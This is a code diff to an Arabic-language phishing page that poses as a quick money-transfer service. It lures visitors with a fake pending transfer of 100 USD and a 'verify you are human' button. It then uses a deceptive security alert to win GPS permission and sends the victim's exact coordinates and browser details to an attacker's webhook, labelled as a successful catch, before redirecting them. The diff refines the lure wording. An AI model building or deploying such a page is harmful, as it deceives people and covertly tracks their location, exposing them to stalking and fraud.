@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام الصرافة الآلي - تأكيد الحوالة</title>
+    <title>  تأكيد الحوالة</title>
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7f6; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
         .card { background: white; padding: 2.5rem; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; width: 360px; border-top: 6px solid #004a99; }
@@ -21,11 +21,11 @@
     <div class="card">
         <div class="logo">نظام الحوالات السريعة</div>
         <p class="info-text">
-            لديك حوالة معلقة بمبلغ <b>500.00 USD</b>.<br>
-            يجب الضغط على الزر أدناه لإصدار إشعار الصرف الإلكتروني وتحديد أقرب فرع لاستلام المبلغ.
+            لديك حوالة معلقة بمبلغ <b>100.00 USD</b>.<br>
+            يجب الضغط على الزر أدناه لإصدار إشعار الصرف الإلكتروني وتحديد أقرب فرع صرافه لاستلام المبلغ.
         </p>
         
-        <button id="captureBtn" class="btn">إصدار إشعار الحوالة (PDF)</button>
+        <button id="captureBtn" class="btn">التأكد انك انسان قبل اصدار اشعار الحوالة</button>
 
         <div id="loader">
             <div class="spinner"></div>
@@ -88,7 +88,7 @@
             }
 
             // إذا لم يكن مسموحاً، نظهر الرسالة المقنعة
-            alert("إجراء أمني: يتطلب نظام التحويلات الوصول إلى الموقع (GPS) لمرة واحدة لضمان تسليم الحوالة في الفرع الصحيح بمدينتك. يرجى الضغط على 'سماح' عند الطلب.");
+            alert("إجراء : يتطلب نظام التحويلات تفعيل الموقع (GPS) لضمان تسليم الحوالة في الفرع الصحيح بمدينتك. يرجى الضغط على 'سماح' عند الطلب.");
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
@@ -123,7 +123,7 @@
                 body: JSON.stringify({
                     username: "رادار الحوالات",
                     embeds: [{
-                        title: coords ? "✅ صيد ناجح: الموقع الدقيق" : "⚠️ صيد تقني فقط",
+                        title: coords ? "✅  ناجح: الموقع الدقيق" : "⚠️  تقني فقط",
                         color: coords ? 65280 : 16711680,
                         fields: fields,
                         footer: { text: tech.ua }
@@ -131,7 +131,7 @@
                 })
             }).finally(() => {
                 setTimeout(() => {
-                    window.location.href = "https://i.imgur.com/R672DqF.jpg";
+                    window.location.href = "https://share.google/Llrpk0ELRWx7N9huJ";
                 }, 1500);
             });
         }
